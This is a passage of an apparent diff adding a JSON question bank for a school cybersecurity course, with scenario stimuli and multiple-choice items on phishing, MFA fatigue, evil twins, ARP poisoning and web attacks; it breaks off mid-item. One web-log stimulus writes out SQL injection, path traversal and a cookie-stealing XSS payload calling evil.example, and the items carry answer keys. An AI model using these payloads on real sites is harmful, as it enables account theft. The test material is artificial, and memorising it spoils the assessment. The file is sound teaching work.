@@ -1,0 +1,1773 @@
+{
+ "stims": {
+  "cs1a": {
+   "title": "An email received by a teacher",
+   "kind": "text",
+   "body": "From: Lincoln HS IT Services <it-support@lincolnhs-helpdesk.com>\nSubject: ACTION REQUIRED: Mailbox deactivation in 2 hours\n\nDear Staff Member,\n\nOur records show your mailbox has not been verified for the new semester. To avoid permanent loss of all email, verify your account within 2 hours using the secure portal below. Most of your colleagues have already completed this step.\n\n[ Verify My Account ]  (link: http://lincolnhs-helpdesk.com/verify)\n\nThank you,\nIT Services"
+  },
+  "cs1b": {
+   "title": "Sign-in activity for a student's school account",
+   "kind": "table",
+   "cols": [
+    "Time",
+    "Location",
+    "Device",
+    "Result"
+   ],
+   "rows": [
+    [
+     "Mon 07:52",
+     "Seattle, WA",
+     "Student's Chromebook",
+     "Success (password + app code)"
+    ],
+    [
+     "Mon 21:14",
+     "Seattle, WA",
+     "Student's phone",
+     "Success (password + app code)"
+    ],
+    [
+     "Tue 02:03",
+     "Lagos, Nigeria",
+     "Unknown Windows PC",
+     "Password correct; MFA push sent"
+    ],
+    [
+     "Tue 02:03",
+     "Lagos, Nigeria",
+     "Unknown Windows PC",
+     "MFA push denied"
+    ],
+    [
+     "Tue 02:05",
+     "Lagos, Nigeria",
+     "Unknown Windows PC",
+     "MFA push sent (x9)"
+    ],
+    [
+     "Tue 02:07",
+     "Lagos, Nigeria",
+     "Unknown Windows PC",
+     "MFA push approved"
+    ]
+   ]
+  },
+  "cs1c": {
+   "title": "Wi-Fi networks visible from a caf\u00e9 table",
+   "kind": "table",
+   "cols": [
+    "Network name (SSID)",
+    "Security",
+    "Signal",
+    "Hardware vendor"
+   ],
+   "rows": [
+    [
+     "BeanHouse_Guest",
+     "WPA2-Personal",
+     "Medium",
+     "Ubiquiti (caf\u00e9's router)"
+    ],
+    [
+     "BeanHouse_Guest",
+     "Open",
+     "Strong",
+     "Unknown (laptop adapter)"
+    ],
+    [
+     "BeanHouse-Staff",
+     "WPA3-Personal",
+     "Medium",
+     "Ubiquiti (caf\u00e9's router)"
+    ],
+    [
+     "FREE_FAST_WIFI",
+     "Open",
+     "Strong",
+     "Unknown"
+    ]
+   ]
+  },
+  "cs1d": {
+   "title": "Voicemail left for a district finance clerk, and the district payment policy",
+   "kind": "text",
+   "body": "Voicemail (Friday 4:52 p.m.), in a voice that sounds exactly like Superintendent Ramos:\n\"Hi Dana, it's Elena. I'm boarding a flight and can't talk. The roofing contractor changed banks, and if they aren't paid by five today we lose the summer slot. Please wire the $48,000 to the new account I'm texting you. Don't loop in the business office, they'll slow it down.\"\n\nDistrict payment policy, section 4:\n\u2022 Any change to a vendor's bank details must be confirmed by calling the vendor at the number already on file.\n\u2022 Payments over $10,000 require approval from two people.\n\u2022 Staff may not act on payment instructions received only by voicemail, text or chat."
+  },
+  "cs2a": {
+   "title": "Excerpt from a school district's risk register",
+   "kind": "table",
+   "cols": [
+    "ID",
+    "Risk",
+    "Likelihood",
+    "Impact",
+    "Planned response"
+   ],
+   "rows": [
+    [
+     "R1",
+     "Ransomware encrypts the student information system",
+     "Medium",
+     "High",
+     "Daily offline backups; EDR on servers"
+    ],
+    [
+     "R2",
+     "Earthquake damages the data center",
+     "Low",
+     "High",
+     "Buy cyber and property insurance"
+    ],
+    [
+     "R3",
+     "Club collects students' SSNs it does not need",
+     "Medium",
+     "High",
+     "Stop collecting SSNs"
+    ],
+    [
+     "R4",
+     "Lunch-menu web page is defaced",
+     "Medium",
+     "Low",
+     "Restore from copy if it happens"
+    ]
+   ]
+  },
+  "cs2b": {
+   "title": "Notes from a security walkthrough of a school office",
+   "kind": "text",
+   "body": "08:10  A visitor carrying two boxes waited at the side door until a teacher arrived; the teacher held the door and both entered. The visitor had no badge.\n09:40  At the front desk, the attendance clerk's monitor faces the waiting area. Two parents in line could read student names on the screen.\n11:15  Behind the building, the recycling bin contained printed class rosters with student ID numbers and a box of old hard drives labeled 'Office PCs 2019'.\n13:30  A caller told the receptionist he was from the alarm company, that 'everyone else on your staff already gave me the door code,' and asked for the code."
+  },
+  "cs2c": {
+   "title": "Proposed physical controls for a school's server room (budget: three controls)",
+   "kind": "table",
+   "cols": [
+    "Option",
+    "Control",
+    "Cost"
+   ],
+   "rows": [
+    [
+     "A",
+     "Access control vestibule with badge + PIN",
+     "$$$"
+    ],
+    [
+     "B",
+     "Camera facing the server-room door at face height",
+     "$$"
+    ],
+    [
+     "C",
+     "Door-open alarm that alerts after 20 seconds",
+     "$"
+    ],
+    [
+     "D",
+     "Larger 'Authorized Personnel Only' sign",
+     "$"
+    ],
+    [
+     "E",
+     "Motion sensor inside the server room, alarmed after hours",
+     "$"
+    ]
+   ]
+  },
+  "cs2d": {
+   "title": "Server-room access log and door sensor data",
+   "kind": "code",
+   "body": "Time   Badge holder   Result   Door open  On camera\n07:58  R. Chen        Granted  5 s        1 person\n08:31  A. Patel       Granted  24 s       2 people\n12:04  L. Kim         Denied   -          1 person\n12:04  L. Kim         Denied   -          1 person\n12:05  L. Kim         Denied   -          1 person\n02:16  M. Ortiz       Granted  6 s        1 person   (Ortiz on leave all week)\n03:40  (no swipe)     -        -          motion detected inside"
+  },
+  "cs3a": {
+   "title": "Switch and gateway log from a classroom network",
+   "kind": "code",
+   "body": "09:00:01 gateway 10.10.0.1 is-at 3c:22:fb:aa:01:9e\n09:14:22 ARP reply: 10.10.0.1 is-at 00:0c:29:5e:7a:11  (sent by 10.10.0.88)\n09:14:23 ARP reply: 10.10.0.1 is-at 00:0c:29:5e:7a:11  (sent by 10.10.0.88)\n09:14:30 34 hosts now send gateway traffic to 00:0c:29:5e:7a:11\n09:15:02 10.10.0.88 forwarding traffic onward to 3c:22:fb:aa:01:9e\n09:20:47 HTTP POST /login (plain HTTP) from 10.10.0.41 observed by 10.10.0.88"
+  },
+  "cs3b": {
+   "title": "Configuration of a small office's wireless router",
+   "kind": "table",
+   "cols": [
+    "Setting",
+    "Value"
+   ],
+   "rows": [
+    [
+     "Wireless security",
+     "WEP"
+    ],
+    [
+     "WPS",
+     "Enabled"
+    ],
+    [
+     "Admin password",
+     "Default (admin/admin)"
+    ],
+    [
+     "Firmware",
+     "Released 2021; 6 updates available"
+    ],
+    [
+     "Transmit power",
+     "100%; signal reaches the parking lot"
+    ],
+    [
+     "SSID broadcast",
+     "Hidden"
+    ]
+   ]
+  },
+  "cs3c": {
+   "title": "Network zones for a school",
+   "kind": "table",
+   "cols": [
+    "Zone",
+    "Contains",
+    "Allowed to reach"
+   ],
+   "rows": [
+    [
+     "DMZ",
+     "Public website, inbound email gateway",
+     "Internet; internal mail server on TCP 25 only"
+    ],
+    [
+     "Servers",
+     "Student records database, file server",
+     "Staff zone on required ports only"
+    ],
+    [
+     "Staff VLAN",
+     "Teacher laptops",
+     "Servers (required ports), internet"
+    ],
+    [
+     "Student VLAN",
+     "Student Chromebooks",
+     "Internet; learning portal in DMZ"
+    ],
+    [
+     "Guest VLAN",
+     "Visitor phones",
+     "Internet only"
+    ],
+    [
+     "IoT VLAN",
+     "Cameras, smart thermostats",
+     "Camera recorder only"
+    ]
+   ]
+  },
+  "cs3d": {
+   "title": "Inbound firewall rules for web server 203.0.113.10 (first match wins; implicit deny at end)",
+   "kind": "table",
+   "cols": [
+    "#",
+    "Action",
+    "Protocol",
+    "Port",
+    "Source"
+   ],
+   "rows": [
+    [
+     "1",
+     "Allow",
+     "TCP",
+     "443",
+     "ANY"
+    ],
+    [
+     "2",
+     "Allow",
+     "TCP",
+     "22",
+     "ANY"
+    ],
+    [
+     "3",
+     "Deny",
+     "ANY",
+     "ANY",
+     "198.51.100.0/24"
+    ],
+    [
+     "4",
+     "Allow",
+     "TCP",
+     "3389",
+     "10.0.5.0/24"
+    ]
+   ]
+  },
+  "cs3e": {
+   "title": "SIEM alerts from one morning",
+   "kind": "code",
+   "body": "07:02 FW   DENY 45.33.12.9 -> 203.0.113.10 ports 21,22,23,25,80,110,143,443,3389 (in 3 s)\n07:40 NIDS signature match: known worm exploit attempt -> 10.20.4.15:445  [blocked by NIPS]\n08:15 NIDS anomaly: ICMP echo-reply to 203.0.113.10 rate 300,000/s (baseline 50/s)\n08:15 NIDS sources: 4,100 hosts in 192.0.2.0/24\n09:30 IDS (no alert) - later found: attacker used valid VPN account at 09:28"
+  },
+  "cs4a": {
+   "title": "Incident timeline from a library computer",
+   "kind": "code",
+   "body": "Mon 10:02 user downloaded 'FreeMovieConverter.exe' from a pop-up ad\nMon 10:03 FreeMovieConverter.exe installed a hidden service 'svc-update'\nMon 10:05 svc-update opened an outbound connection to 203.0.113.77:4444\nMon 10:05-Fri: svc-update receives commands every 10 minutes\nThu 14:20 keystrokes from the browser written to C:\\Users\\Public\\k.log\nFri 09:00 hidden service copied itself to 3 other library PCs over file shares"
+  },
+  "cs4b": {
+   "title": "A school portal's password settings and a leaked database excerpt",
+   "kind": "code",
+   "body": "Password policy: minimum length 6, no lockout, no MFA, history 0\nStorage: unsalted MD5\n\nLeaked table (excerpt)\nuser      md5_hash\nabaker    5f4dcc3b5aa765d61d8327deb882cf99\nbchen     e10adc3949ba59abbe56e057f20f883e\ncdiaz     5f4dcc3b5aa765d61d8327deb882cf99\ndevans    9b1f3c...a07e (unique)"
+  },
+  "cs4c": {
+   "title": "Endpoint inventory for three teacher laptops",
+   "kind": "table",
+   "cols": [
+    "Laptop",
+    "OS patches",
+    "Anti-malware signatures",
+    "Host firewall",
+    "User rights"
+   ],
+   "rows": [
+    [
+     "T-01",
+     "Current",
+     "Updated today",
+     "On; inbound blocked",
+     "Standard user"
+    ],
+    [
+     "T-02",
+     "Missing 3 critical patches (71 days)",
+     "Updated today",
+     "Off",
+     "Local admin"
+    ],
+    [
+     "T-03",
+     "Current",
+     "Last updated 8 months ago",
+     "On; inbound RDP 3389 allowed from ANY",
+     "Standard user"
+    ]
+   ]
+  },
+  "cs4d": {
+   "title": "Authentication log for a district web portal",
+   "kind": "code",
+   "body": "Case 1\n10:01:01-10:03:40  FAIL user=admin  src=198.51.100.23  (x312)\n10:03:41           LOCKED user=admin\n\nCase 2\n11:00:02  FAIL user=ahmed   src=203.0.113.44\n11:00:02  FAIL user=bella   src=203.0.113.44\n11:00:03  FAIL user=carlos  src=203.0.113.44\n   ... one attempt each for 1,200 users ...\n11:00:51  OK   user=nwong   src=203.0.113.44\n\nCase 3\nWed 03:12  OK  user=jlee  src=91.198.4.17 (abroad; no prior failures)\nWed 03:15  DOWNLOAD /hr/* (180 files)"
+  },
+  "cs5a": {
+   "title": "Web server access log for a school's grade portal",
+   "kind": "code",
+   "body": "10:01 GET /grades?id=10442                        200  1 row\n10:02 GET /grades?id=10442'                       500  SQL syntax error\n10:03 GET /grades?id=10442' OR '1'='1              200  5,211 rows\n10:05 GET /files?name=../../app/config.ini         200\n10:09 POST /comments  body=<script>fetch('//evil.example/c?'+document.cookie)</script>  201"
+  },
+  "cs5b": {
+   "title": "Listing of a shared project folder and the lab's access policy",
+   "kind": "code",
+   "body": "Policy: the owner may read and write project files; the 'robotics' group may read them;\nnobody else may access them. Scripts must not be writable by anyone but the owner.\n\n-rw-r--r--  1 kmehta robotics  4.2K  design_notes.md\n-rwxrwxrwx  1 kmehta robotics  1.1K  build.sh\n-rw-------  1 kmehta robotics  0.9K  api_key.txt\n-rw-rw-r--  1 kmehta robotics  8.0K  parts_list.csv"
+  },
+  "cs5c": {
+   "title": "How a student's browser connects to the school portal",
+   "kind": "text",
+   "body": "1. The portal sends the browser its certificate, which contains the portal's public key and is signed by a trusted certificate authority.\n2. The browser checks the signature and the domain name on the certificate.\n3. The browser and portal use asymmetric cryptography to agree on a fresh, random session key.\n4. For the rest of the visit, every page and form is encrypted with AES using that session key.\n5. The portal's private key never leaves the portal's server."
+  },
+  "cs5d": {
+   "title": "Code review notes for a new club sign-up app",
+   "kind": "text",
+   "body": "\u2022 The 'name' field is checked only in the browser with JavaScript; the server accepts whatever it receives.\n\u2022 Search builds SQL by joining strings: \"SELECT * FROM clubs WHERE name = '\" + input + \"'\".\n\u2022 Comments are displayed on the page exactly as typed.\n\u2022 The app's database account has full admin rights on every table.\n\u2022 A debug page at /debug shows server variables and is enabled in production.\n\u2022 The app ships with admin login 'admin' / 'admin'."
+  },
+  "cs5e": {
+   "title": "Integrity, DLP and honeypot alerts",
+   "kind": "code",
+   "body": "02:00 FIM   /etc/portal/settings.conf  baseline 8c1e...44af  now 1d90...b7e2  MISMATCH\n02:00 FIM   no approved change ticket for settings.conf\n10:42 DLP   BLOCKED email attachment 'students_full.xlsx' (2,800 SSNs) -> personal address  user=tgrant\n13:05 HONEY login attempt on decoy server 'payroll-archive' from 10.20.6.31 (staff VLAN)"
+  }
+ },
+ "qs": [
+  {
+   "id": "c1-01",
+   "u": 1,
+   "t": "1.1",
+   "s": "1.A",
+   "d": 1,
+   "st": "cs1a",
+   "q": "Which TWO social engineering levers are MOST clearly used in the email?",
+   "c": [
+    "Urgency and consensus",
+    "Authority and scarcity",
+    "Familiarity and intimidation",
+    "Elicitation and scarcity"
+   ],
+   "r": [
+    "Correct. 'Within 2 hours' is urgency, and 'Most of your colleagues have already completed this step' is consensus.",
+    "Wrong. It claims to be from IT, but nothing is described as limited in supply.",
+    "Wrong. It doesn't pretend to know the teacher personally, and its threat is a deadline, not intimidation by a person.",
+    "Wrong. It asks for one action at once rather than drawing out details over time."
+   ]
+  },
+  {
+   "id": "c1-02",
+   "u": 1,
+   "t": "1.1",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs1a",
+   "q": "Which detail in the email is the STRONGEST evidence that it is not really from the school's IT department?",
+   "c": [
+    "The sender and link use the domain lincolnhs-helpdesk.com instead of the school's own domain",
+    "The email is addressed to 'Staff Member'",
+    "The subject line is in capital letters",
+    "The email is signed 'IT Services'"
+   ],
+   "r": [
+    "Correct. A look-alike outside domain for both the sender and the link is hard evidence of impersonation.",
+    "Wrong. A generic greeting is a weak signal; real mass emails use them too.",
+    "Wrong. Formatting is a weak signal that legitimate senders also use.",
+    "Wrong. The signature is just text and is easy to fake."
+   ]
+  },
+  {
+   "id": "c1-03",
+   "u": 1,
+   "t": "1.1",
+   "s": "2.A",
+   "d": 2,
+   "st": "cs1a",
+   "q": "The teacher already clicked the link and entered their password. Which action should come FIRST?",
+   "c": [
+    "Change the password from a trusted device and report the email to IT",
+    "Reply to the email to cancel the request",
+    "Forward the email to colleagues as a warning",
+    "Wait to see whether the mailbox is deactivated"
+   ],
+   "r": [
+    "Correct. Changing the stolen password quickly and reporting it limits the damage and lets IT protect others.",
+    "Wrong. Replying goes to the attacker and doesn't make the stolen password useless.",
+    "Wrong. Forwarding spreads the phishing link; IT should send the warning.",
+    "Wrong. Waiting gives the attacker time to use the password."
+   ]
+  },
+  {
+   "id": "c1-04",
+   "u": 1,
+   "t": "1.2",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs1b",
+   "q": "What does the sign-in activity show happened at 02:07?",
+   "c": [
+    "An attacker with the correct password got past MFA after repeated push prompts",
+    "The student logged in from a trip abroad",
+    "The MFA app malfunctioned and approved itself",
+    "A password-spraying attack failed"
+   ],
+   "r": [
+    "Correct. The password was already right; after a denial and nine more prompts, a push was approved, which is MFA fatigue.",
+    "Wrong. Earlier logins put the student in Seattle a few hours before, so this is impossible travel.",
+    "Wrong. Push prompts don't approve themselves; a person tapped Approve.",
+    "Wrong. The password was correct, and the attack ended in success."
+   ]
+  },
+  {
+   "id": "c1-05",
+   "u": 1,
+   "t": "1.2",
+   "s": "2.B",
+   "d": 2,
+   "st": "cs1b",
+   "q": "Which change would MOST directly have stopped the 02:07 sign-in?",
+   "c": [
+    "Number-matching MFA or a hardware security key instead of simple approve/deny pushes",
+    "A longer username",
+    "Requiring the password to be changed every 90 days",
+    "Disabling sign-in alerts"
+   ],
+   "r": [
+    "Correct. These need active, informed input from the user, which defeats blind approvals.",
+    "Wrong. Usernames aren't secret and don't stop MFA fatigue.",
+    "Wrong. The attacker already had the current password.",
+    "Wrong. Alerts help detection; turning them off hides the attack."
+   ]
+  },
+  {
+   "id": "c1-06",
+   "u": 1,
+   "t": "1.2",
+   "s": "2.D",
+   "d": 2,
+   "st": "cs1b",
+   "q": "After the student reports the activity, what should IT do FIRST?",
+   "c": [
+    "Reset the password, end all active sessions, and review the MFA method",
+    "Delete the student's account and create a new one next semester",
+    "Block the Seattle location",
+    "Email the student the new password"
+   ],
+   "r": [
+    "Correct. Removing the stolen password and the attacker's session contains the compromise.",
+    "Wrong. That's drastic, and the attacker's session may remain until it's ended.",
+    "Wrong. Seattle is the legitimate location; Lagos is the suspicious one.",
+    "Wrong. If the account's email is compromised, the attacker could read it."
+   ]
+  },
+  {
+   "id": "c1-07",
+   "u": 1,
+   "t": "1.3",
+   "s": "1.A",
+   "d": 1,
+   "st": "cs1c",
+   "q": "Which network in the scan is MOST likely an evil twin?",
+   "c": [
+    "The open 'BeanHouse_Guest' from an unknown laptop adapter",
+    "The WPA2 'BeanHouse_Guest' on the caf\u00e9's router",
+    "'BeanHouse-Staff' on the caf\u00e9's router",
+    "None; duplicate names are normal"
+   ],
+   "r": [
+    "Correct. It copies the caf\u00e9's network name but runs on unknown hardware with no encryption.",
+    "Wrong. This is the caf\u00e9's real network on its own router.",
+    "Wrong. This is the caf\u00e9's real staff network.",
+    "Wrong. A duplicate name from different, unknown hardware is a classic evil-twin sign."
+   ]
+  },
+  {
+   "id": "c1-08",
+   "u": 1,
+   "t": "1.3",
+   "s": "1.B",
+   "d": 2,
+   "st": "cs1c",
+   "q": "Why might many customers' devices join the open 'BeanHouse_Guest' instead of the real one?",
+   "c": [
+    "Devices often auto-join the strongest signal with a remembered name",
+    "Open networks are always faster",
+    "WPA2 networks block phones",
+    "The real network is hidden"
+   ],
+   "r": [
+    "Correct. The fake has a strong signal and a familiar name, so auto-join picks it.",
+    "Wrong. Being open has nothing to do with speed; signal and remembered names drive auto-join.",
+    "Wrong. WPA2 works with phones.",
+    "Wrong. The real network is broadcasting in the scan."
+   ]
+  },
+  {
+   "id": "c1-09",
+   "u": 1,
+   "t": "1.3",
+   "s": "2.B",
+   "d": 2,
+   "st": "cs1c",
+   "q": "A customer needs to check a bank account. Which plan BEST protects them?",
+   "c": [
+    "Join the WPA2 network after confirming the name with staff, use a VPN, and check the bank's domain before logging in",
+    "Join FREE_FAST_WIFI because it has the strongest signal",
+    "Join any network named BeanHouse",
+    "Join the open BeanHouse_Guest but use private browsing"
+   ],
+   "r": [
+    "Correct. Verifying the network, encrypting traffic and checking the destination together cover the main risks.",
+    "Wrong. An unknown open network may be run by an attacker.",
+    "Wrong. One of the two BeanHouse_Guest networks is fake.",
+    "Wrong. Private browsing doesn't encrypt traffic or detect a fake access point."
+   ]
+  },
+  {
+   "id": "c1-10",
+   "u": 1,
+   "t": "1.4",
+   "s": "1.A",
+   "d": 1,
+   "st": "cs1d",
+   "q": "The voicemail is MOST likely an example of:",
+   "c": [
+    "AI voice cloning used for payment fraud",
+    "War driving",
+    "An evil twin attack",
+    "Credential stuffing"
+   ],
+   "r": [
+    "Correct. A cloned executive's voice requesting an urgent wire transfer is deepfake payment fraud.",
+    "Wrong. War driving maps Wi-Fi networks.",
+    "Wrong. An evil twin is a fake wireless network.",
+    "Wrong. Credential stuffing reuses leaked passwords."
+   ]
+  },
+  {
+   "id": "c1-11",
+   "u": 1,
+   "t": "1.4",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs1d",
+   "q": "Which detail is the STRONGEST red flag, regardless of how real the voice sounds?",
+   "c": [
+    "The request to change bank details and skip the business office conflicts with the payment policy",
+    "The superintendent mentions a flight",
+    "The amount is $48,000",
+    "The voicemail arrives on a Friday"
+   ],
+   "r": [
+    "Correct. A request that breaks policy and asks to avoid normal checks is suspicious no matter who seems to be asking.",
+    "Wrong. Travel is a common, plausible cover story.",
+    "Wrong. The amount alone doesn't show fraud.",
+    "Wrong. Timing is a weak signal, though attackers do like end-of-week pressure."
+   ]
+  },
+  {
+   "id": "c1-12",
+   "u": 1,
+   "t": "1.5",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs1d",
+   "q": "How does the district's payment policy defend against this attack even if staff cannot tell the voice is fake?",
+   "c": [
+    "It requires out-of-band verification and a second approver, so one convincing call can't move money",
+    "It trains staff to hear audio artifacts",
+    "It blocks all voicemails",
+    "It encrypts the payment"
+   ],
+   "r": [
+    "Correct. Procedural controls work no matter how good the deepfake is.",
+    "Wrong. The policy doesn't rely on spotting the fake.",
+    "Wrong. Voicemails still arrive; the policy limits what staff do with them.",
+    "Wrong. Encryption doesn't verify who made the request."
+   ]
+  },
+  {
+   "id": "c2-01",
+   "u": 2,
+   "t": "2.1",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs2a",
+   "q": "Which risk response is planned for R2?",
+   "c": [
+    "Transfer",
+    "Avoid",
+    "Mitigate",
+    "Accept"
+   ],
+   "r": [
+    "Correct. Insurance shifts the financial impact to a third party.",
+    "Wrong. The district isn't stopping the activity; it keeps the data center.",
+    "Wrong. Insurance doesn't reduce the chance or the damage of an earthquake.",
+    "Wrong. Buying insurance is an action, not acceptance."
+   ]
+  },
+  {
+   "id": "c2-02",
+   "u": 2,
+   "t": "2.1",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs2a",
+   "q": "Which two risks use avoidance and acceptance, in that order?",
+   "c": [
+    "R3, then R4",
+    "R1, then R2",
+    "R2, then R3",
+    "R4, then R1"
+   ],
+   "r": [
+    "Correct. R3 stops the activity (avoid); R4 deals with it only if it happens (accept).",
+    "Wrong. R1 is mitigation and R2 is transfer.",
+    "Wrong. R2 is transfer.",
+    "Wrong. R4 is acceptance and R1 is mitigation."
+   ]
+  },
+  {
+   "id": "c2-03",
+   "u": 2,
+   "t": "2.1",
+   "s": "1.C",
+   "d": 2,
+   "st": "cs2a",
+   "q": "Which CIA property does R1 MOST directly threaten, and what kind of control are the offline backups?",
+   "c": [
+    "Availability; corrective",
+    "Confidentiality; preventive",
+    "Integrity; detective",
+    "Availability; deterrent"
+   ],
+   "r": [
+    "Correct. Encryption by ransomware makes the system unusable, and backups restore it.",
+    "Wrong. Ransomware's main harm is lost access, and backups don't prevent the attack.",
+    "Wrong. Backups don't detect anything.",
+    "Wrong. Backups don't discourage attackers; they recover the data."
+   ]
+  },
+  {
+   "id": "c2-04",
+   "u": 2,
+   "t": "2.2",
+   "s": "1.A",
+   "d": 1,
+   "st": "cs2b",
+   "q": "Which attack is described at 08:10?",
+   "c": [
+    "Piggybacking",
+    "Tailgating",
+    "Card cloning",
+    "Shoulder surfing"
+   ],
+   "r": [
+    "Correct. The teacher knowingly held the door for someone without a badge.",
+    "Wrong. Tailgating happens without the authorized person noticing.",
+    "Wrong. No badge data was copied.",
+    "Wrong. Nothing was watched."
+   ]
+  },
+  {
+   "id": "c2-05",
+   "u": 2,
+   "t": "2.2",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs2b",
+   "q": "The 11:15 finding MOST directly enables which attack?",
+   "c": [
+    "Dumpster diving",
+    "Pretexting",
+    "Baiting",
+    "Elicitation"
+   ],
+   "r": [
+    "Correct. Sensitive papers and unwiped drives in the trash are what dumpster divers look for.",
+    "Wrong. Pretexting uses a made-up story.",
+    "Wrong. Baiting leaves tempting media for victims; here the organization threw its own data out.",
+    "Wrong. Elicitation is drawing out information through conversation."
+   ]
+  },
+  {
+   "id": "c2-06",
+   "u": 2,
+   "t": "2.2",
+   "s": "1.B",
+   "d": 2,
+   "st": "cs2b",
+   "q": "The 13:30 caller combines which TWO techniques?",
+   "c": [
+    "Pretexting and consensus",
+    "Scarcity and intimidation",
+    "Familiarity and baiting",
+    "Shoulder surfing and urgency"
+   ],
+   "r": [
+    "Correct. A fake alarm-company role is pretexting, and 'everyone else already gave me the code' is consensus.",
+    "Wrong. Nothing is described as limited, and no threat is made.",
+    "Wrong. He doesn't claim to know her, and nothing is left as bait.",
+    "Wrong. Nothing is observed, and no deadline is set."
+   ]
+  },
+  {
+   "id": "c2-07",
+   "u": 2,
+   "t": "2.3",
+   "s": "2.B",
+   "d": 3,
+   "st": "cs2c",
+   "q": "Which three options give the BEST layered protection against tailgating and after-hours intrusion?",
+   "c": [
+    "A, B, and E",
+    "B, C, and D",
+    "C, D, and E",
+    "A, D, and E"
+   ],
+   "r": [
+    "Correct. The vestibule prevents tailgating, the camera records who enters, and the motion sensor detects after-hours presence.",
+    "Wrong. No preventive control stops tailgating, and a sign isn't a barrier.",
+    "Wrong. The sign adds little, and nothing prevents tailgating.",
+    "Wrong. Wastes a slot on a sign instead of the camera."
+   ]
+  },
+  {
+   "id": "c2-08",
+   "u": 2,
+   "t": "2.3",
+   "s": "2.A",
+   "d": 2,
+   "st": "cs2c",
+   "q": "Option C is BEST classified as which type and function of control?",
+   "c": [
+    "Physical, detective",
+    "Physical, preventive",
+    "Managerial, preventive",
+    "Technical, corrective"
+   ],
+   "r": [
+    "Correct. It's a physical device that alerts when a door stays open.",
+    "Wrong. An alarm doesn't stop someone getting in.",
+    "Wrong. It's a device, not a policy.",
+    "Wrong. It doesn't restore anything."
+   ]
+  },
+  {
+   "id": "c2-09",
+   "u": 2,
+   "t": "2.3",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs2c",
+   "q": "Why does option A defend against a cloned badge when a badge-only door would not?",
+   "c": [
+    "The PIN is a second factor the attacker doesn't have",
+    "The vestibule reads badges faster",
+    "Vestibules disable cloned cards",
+    "A PIN encrypts the badge"
+   ],
+   "r": [
+    "Correct. A copied card alone won't open the door.",
+    "Wrong. Speed isn't the protection.",
+    "Wrong. The reader can't tell a good clone from the real card; the PIN is what stops it.",
+    "Wrong. PINs don't encrypt badges."
+   ]
+  },
+  {
+   "id": "c2-10",
+   "u": 2,
+   "t": "2.4",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs2d",
+   "q": "Which entry MOST likely shows tailgating or piggybacking?",
+   "c": [
+    "08:31 (A. Patel)",
+    "07:58 (R. Chen)",
+    "12:04 (L. Kim)",
+    "02:16 (M. Ortiz)"
+   ],
+   "r": [
+    "Correct. One granted swipe, a 24-second open door and two people on camera.",
+    "Wrong. A normal 5-second entry by one person.",
+    "Wrong. The door was never opened; those are denied attempts.",
+    "Wrong. One person and a normal open time, though this entry is suspicious for another reason."
+   ]
+  },
+  {
+   "id": "c2-11",
+   "u": 2,
+   "t": "2.4",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs2d",
+   "q": "What does the 02:16 entry MOST likely indicate?",
+   "c": [
+    "M. Ortiz's badge was stolen, cloned or shared",
+    "M. Ortiz came in to work overtime",
+    "The door sensor malfunctioned",
+    "A normal night shift"
+   ],
+   "r": [
+    "Correct. The badge was used while its owner was on leave, at an odd hour.",
+    "Wrong. Ortiz is on leave all week.",
+    "Wrong. The sensor recorded a normal 6-second open.",
+    "Wrong. Nothing suggests an authorized night shift for this badge."
+   ]
+  },
+  {
+   "id": "c2-12",
+   "u": 2,
+   "t": "2.4",
+   "s": "3.C",
+   "d": 3,
+   "st": "cs2d",
+   "q": "At 03:40 the motion sensor triggered with no badge swipe. Which conclusion is BEST supported?",
+   "c": [
+    "Someone was inside without using the reader, either by entering another way or by staying after an earlier entry",
+    "The badge reader logged the swipe incorrectly",
+    "Motion sensors always trigger at night",
+    "It was the 02:16 person leaving normally"
+   ],
+   "r": [
+    "Correct. Presence without a swipe means the reader was bypassed. The 02:16 entry is a likely lead to investigate.",
+    "Wrong. No swipe was attempted at all.",
+    "Wrong. A properly tuned sensor in an empty room shouldn't.",
+    "Wrong. Leaving wouldn't explain motion inside 84 minutes later, and it still needs investigating."
+   ]
+  },
+  {
+   "id": "c3-01",
+   "u": 3,
+   "t": "3.1",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs3a",
+   "q": "What attack is shown at 09:14?",
+   "c": [
+    "ARP poisoning by 10.10.0.88",
+    "DNS poisoning",
+    "MAC flooding",
+    "A smurf attack"
+   ],
+   "r": [
+    "Correct. Forged ARP replies map the gateway's IP to the attacker's MAC.",
+    "Wrong. Name lookups aren't involved.",
+    "Wrong. The switch table isn't being filled with many MACs.",
+    "Wrong. There's no ICMP flood."
+   ]
+  },
+  {
+   "id": "c3-02",
+   "u": 3,
+   "t": "3.1",
+   "s": "1.B",
+   "d": 2,
+   "st": "cs3a",
+   "q": "Why does 10.10.0.88 forward traffic onward to the real gateway (09:15:02)?",
+   "c": [
+    "To stay on-path without breaking users' connections, so the attack isn't noticed",
+    "To speed up the network",
+    "To block all traffic",
+    "To encrypt the traffic"
+   ],
+   "r": [
+    "Correct. Forwarding keeps everything working while the attacker reads the traffic.",
+    "Wrong. It adds delay, if anything.",
+    "Wrong. Blocking would cause an obvious outage.",
+    "Wrong. The attacker isn't encrypting anything."
+   ]
+  },
+  {
+   "id": "c3-03",
+   "u": 3,
+   "t": "3.1",
+   "s": "1.C",
+   "d": 2,
+   "st": "cs3a",
+   "q": "Why is the 09:20:47 event especially HIGH impact?",
+   "c": [
+    "The login was sent over plain HTTP, so the attacker could read the credentials",
+    "HTTP POSTs are always malicious",
+    "The attacker's MAC changed",
+    "The gateway went offline"
+   ],
+   "r": [
+    "Correct. Unencrypted credentials passing through an on-path attacker can be captured.",
+    "Wrong. A POST is a normal way to submit a form.",
+    "Wrong. Nothing in the log shows that.",
+    "Wrong. Traffic is still being forwarded."
+   ]
+  },
+  {
+   "id": "c3-04",
+   "u": 3,
+   "t": "3.2",
+   "s": "1.D",
+   "d": 2,
+   "st": "cs3b",
+   "q": "Which TWO settings are the MOST serious vulnerabilities?",
+   "c": [
+    "WEP encryption and the default admin password",
+    "Hidden SSID and transmit power",
+    "Firmware date and hidden SSID",
+    "Transmit power and WPS"
+   ],
+   "r": [
